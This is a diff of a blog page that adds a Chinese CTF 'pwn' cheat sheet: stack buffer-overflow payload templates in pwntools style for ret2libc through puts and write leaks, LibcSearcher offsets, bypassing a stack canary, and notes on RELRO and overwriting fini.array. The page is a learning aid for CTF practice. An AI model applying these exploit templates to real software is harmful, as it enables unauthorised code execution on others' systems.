@@ -223,7 +223,7 @@
       
       <span class="tag">
         
-        <a href="/tags/PWN/" style="color: #00bcd4; margin-right: 0.5rem;">PWN</a>
+        <a href="/tags/PWN/" style="color: #03a9f4; margin-right: 0.5rem;">PWN</a>
       </span>
       
     </span>
@@ -240,6 +240,80 @@
         <div class="content" v-pre>
           <p>PWN PWN PWN !!! 技巧 (1)</p>
 <span id="more"></span>
+
+<h1 id="简介"><span id="简介">简介：</span></h1><p>记录一下，基础的知识点和一些工具的用法，解题模板等（本人记性差时不时会忘记，记录一下与大家共勉）</p>
+<hr>
+<h2 id="32位传参"><span id="32位传参">32位传参</span></h2><p>32位传参的方式是通过栈来传参的，与构造的payload也是有关的，大致如下：(有时候也会变根据题目意思来)</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = 填充的数据 + system + 垃圾数据 + binsh</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="64位传参"><span id="64位传参">64位传参</span></h2><p>64位传参前六个参数是通过寄存器来传参的，分别为 rdi、rsi、rdx、rcx、r8、r9，之后的参数是通过栈传递的，同样构造 payload 也有一套，但还是需要具体问题具体分析，大致如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = 填充的数据 + rdi + binsh + system</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="32位泄露libc之puts"><span id="32位泄露libc之puts">32位泄露libc之puts</span></h2><p>这里只写构造 payload 的大体模板，其他的都是通式做多了就知道了（填充的数据是可以变的啊，main_addr 也就是你需要返回的地址）</p>
+<p><strong>第一次 payload 泄露 libc：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p32(main_addr) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二次 payload 获得 shell：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(ret_addr) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="64位泄露libc之puts"><span id="64位泄露libc之puts">64位泄露libc之puts</span></h2><p><strong>第一次 payload 泄露 libc：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(main_addr)</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二次 payload 得 shell：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="32位泄露libc之write"><span id="32位泄露libc之write">32位泄露libc之write</span></h2><p><strong>第一次 payload 泄露 libc：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(main_addr) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二次 payload 获得 shell：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(ret_addr) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="64位泄露libc之write"><span id="64位泄露libc之write">64位泄露libc之write</span></h2><p><strong>第一次 payload 泄露 libc：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p64(main_addr)</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二次 payload 得 shell：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="泄露libc之有libc文件"><span id="泄露libc之有libc文件">泄露libc之有libc文件</span></h2><p>给 fresh pwner 提醒下，这里的 puts 是可以换的（看你是通过 puts 函数泄露的还是通过 write 函数泄露的，通过哪个写哪个）仔细观察有无 libc 文件的区别（发现没中小括号也是要区分的哦，可以自己试试）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="泄露libc之无libc文件"><span id="泄露libc之无libc文件">泄露libc之无libc文件</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="canary"><span id="canary">Canary</span></h2><p><strong>第一次泄露 libc：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(vuln)</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二次获得 shell：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="relro"><span id="relro">Relro</span></h2><ol>
+<li>RELRO 防御策略：<ul>
+<li>NO RELRO：<code>init.array</code>、<code>fini.array</code>、<code>got.plt</code> 均可读可写</li>
+<li>PARTIAL RELRO：<code>init.array</code>、<code>fini.array</code> 可读不可写，<code>got.plt</code> 可读可写</li>
+<li>FULL RELRO：<code>init.array</code>、<code>fini.array</code>、<code>got.plt</code> 均可读不可写</li>
+</ul>
+</li>
+<li>Linux 程序运行时：<ul>
+<li>在加载的时候，会依次调用 <code>init.array</code> 数组中的每一个函数指针</li>
+<li>在结束的时候，依次调用 <code>fini.array</code> 中的每一个函数指针</li>
+</ul>
+</li>
+<li>当程序出现格式化字符串漏洞，但是至少需要写两次才能完成攻击。<ul>
+<li>当少于两个输入点时，可以考虑改写 <code>fini.array</code> 中的函数指针为 <code>main</code> 函数地址，可以再执行一次 <code>main</code> 函数。</li>
+<li>一般来说，这个数组的长度为 1，也就是说只能写一个地址。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h1 id="总结"><span id="总结">总结：</span></h1><p>多做 pwn，多总结，加油，冲冲冲！！！</p>
 
         </div>
       
@@ -327,7 +401,7 @@
           <div class="toc-header">
             <i class="fa-solid fa-list-ul"></i> 目录
           </div>
-          
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#32%E4%BD%8D%E4%BC%A0%E5%8F%82"><span class="toc-number">1.1.</span> <span class="toc-text">32位传参</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D%E4%BC%A0%E5%8F%82"><span class="toc-number">1.2.</span> <span class="toc-text">64位传参</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32%E4%BD%8D%E6%B3%84%E9%9C%B2libc%E4%B9%8Bputs"><span class="toc-number">1.3.</span> <span class="toc-text">32位泄露libc之puts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D%E6%B3%84%E9%9C%B2libc%E4%B9%8Bputs"><span class="toc-number">1.4.</span> <span class="toc-text">64位泄露libc之puts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32%E4%BD%8D%E6%B3%84%E9%9C%B2libc%E4%B9%8Bwrite"><span class="toc-number">1.5.</span> <span class="toc-text">32位泄露libc之write</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D%E6%B3%84%E9%9C%B2libc%E4%B9%8Bwrite"><span class="toc-number">1.6.</span> <span class="toc-text">64位泄露libc之write</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc%E4%B9%8B%E6%9C%89libc%E6%96%87%E4%BB%B6"><span class="toc-number">1.7.</span> <span class="toc-text">泄露libc之有libc文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc%E4%B9%8B%E6%97%A0libc%E6%96%87%E4%BB%B6"><span class="toc-number">1.8.</span> <span class="toc-text">泄露libc之无libc文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#canary"><span class="toc-number">1.9.</span> <span class="toc-text">Canary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#relro"><span class="toc-number">1.10.</span> <span class="toc-text">Relro</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结：</span></a></li></ol>
         </div>
       </div>
     </div>
